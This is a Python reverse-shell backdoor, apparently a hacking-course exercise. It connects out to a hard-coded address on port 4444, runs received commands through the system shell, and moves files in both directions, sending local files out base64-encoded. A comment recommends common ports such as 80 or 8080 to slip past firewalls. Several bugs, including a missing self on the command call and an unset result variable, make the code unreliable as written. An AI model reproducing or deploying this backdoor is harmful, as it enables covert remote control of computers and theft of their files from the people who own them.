#!usr/bin/env python

import socket, subprocess, json, os, base64, sys

def main():
    backdoor = Backdoor('10.0.1.6', 4444)
    backdoor.start()

class Backdoor:

    def __init__(self, IP, socket):
        self.IP = IP
        self.socket = socket

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, name):
        with open(name, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, content):
        with open(name, 'wb') as file:
            file.write(base64.b64decode(content))
            return "good transfer"
    
    def start(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #could be good to use common ports here like 80 or 8080 to not trigger firewall
            self.connection.connect((self.IP, self.socket))
            self.reliable_send('\n[+] Connection established.\n\n>>')

            while True:
                command = self.reliable_recieve()
                try:
                    if command[0] == 'exit':
                        self.connection.close()
                        sys.exit()
                    if command[0] == 'cd' and command[1]:
                        command_result = self.change_working_dir(command[1])
                    if command[0] == 'download':
                        command_result = self.read_file(command[1]).decode()
                    if command[0] == 'upload':
                        command_result = self.write_file(command[1], command[3])
                    if not command_result:
                        command_result = execute_command(command).decode()
                    self.reliable_send(command_result)
                except Exception:
                    command_result = f'[-] Error in command execution.'
        except KeyboardInterrupt:
            self.connection.close()
            print('\n[+] Connection closed. Exiting...')
            exit()

if __name__ == '__main__':
    main()